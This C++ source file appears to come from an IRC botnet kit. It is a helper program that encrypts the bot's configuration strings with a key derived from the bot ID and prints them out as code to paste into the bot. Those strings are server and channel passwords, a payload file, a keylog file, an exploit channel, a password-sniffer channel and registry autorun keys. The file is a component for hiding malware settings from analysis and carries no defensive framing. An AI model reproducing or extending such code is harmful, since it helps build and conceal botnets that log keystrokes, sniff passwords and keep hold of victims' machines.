// Blow.cpp : Defines the entry point for the console application.
//
#pragma comment(linker,"/RELEASE")			// Release code
//#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
//#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
#pragma pack(1)			

#include "stdafx.h"
#include "fish.h"	// holds the random digit tables
#include "../rndnick.h"
#define NO_CRYPT
#include "../configs.h"
//#include "../sha/sha.h"

void blowcryptp(char *data, char name[]){
	if (!((botid==NULL||data==NULL) ||(*botid==NULL || *data==NULL))){
    char *p = encrypt_string(botid,data);
	printf ("char %s[]=\"%s\"; //%s\r\n",name,p,data);
	delete p;
	}
} 

int _tmain(int argc, _TCHAR* argv[])
{
/* hash SHA1
	const byte message[] = {'a', 'b', 'c'};
	const byte expectedDigest[] = {0xA9,0x99,0x3E,0x36,0x47,0x06,0x81,0x6A,0xBA,0x3E,0x25,0x71,0x78,0x50,0xC2,0x6C,0x9C,0xD0,0xD8,0x9D};
	byte digest[20];
	
	SHA sha;
//	HashFilter shaFilter(sha, new HexEncoder);
	sha.Update(message, 3);
	sha.Final(digest);
*/
	char blowpass[16];//[]="secret";
	char content[512];
/*
	printf("(init test)\r\n");
	//strcpy(blowpass,"secret");
	sprintf(blowpass,"%s",botid);
	strcpy(content,"data content");
	//sprintf(blowpass,"%i",rand()*50);
	printf("password=botid: %s\r\n",blowpass);
	printf("content: %s\r\n",content);
	printf("(encrypt)\r\n");
	BlowCrypt(blowpass,content);
	//sprintf(blowpass,"%s","secret");
	printf("password after: %s\r\n",blowpass);
	printf("encrypted content: %s\r\n",content);
	printf("(decrypt)\r\n");
	BlowDeCrypt(blowpass,content);
	printf("decrypted content: %s\r\n",content);
	printf("password after: %s\r\n",blowpass);
	KlientBlowCrypt(blowpass,content);

	printf("(klient encrypt)\r\n");
	printf("encrypted Klient content: %s\r\n",content);
	printf("// (copypaste start)\r\n");
*/

	blowcryptp(version,"version");
	blowcryptp(password,"password");
	blowcryptp(modeonconn,"modeonconn");	
	blowcryptp(nickconst,"nickconst");

	blowcryptp(server,"server");
	blowcryptp(server2,"server2");
	blowcryptp(serverpass,"serverpass");

	blowcryptp(channel,"channel");
	blowcryptp(chanpass,"chanpass");

	blowcryptp(channel2,"channel2");
	blowcryptp(chanpass2,"chanpass2");

	blowcryptp(filename,"filename");
	blowcryptp(valuename,"valuename");
	blowcryptp(szLocalPayloadFile,"szLocalPayloadFile");
	blowcryptp(keylogfile,"keylogfile");

	blowcryptp(exploitchan,"exploitchan");
//	blowcryptp(keylogchan,"keylogchan");
	blowcryptp(psniffchan,"psniffchan");
	
	

	blowcryptp(regkey1,"regkey1");
	blowcryptp(regkey2,"regkey2");
	blowcryptp(regkey3,"regkey3");
	blowcryptp(regkey4,"regkey4");
	char ahost[]="*@$$$.fbi.gov";
	blowcryptp(ahost,"*@$$$.fbi.gov");
	printf("// (copypaster end)\r\n");
	return 0;
}

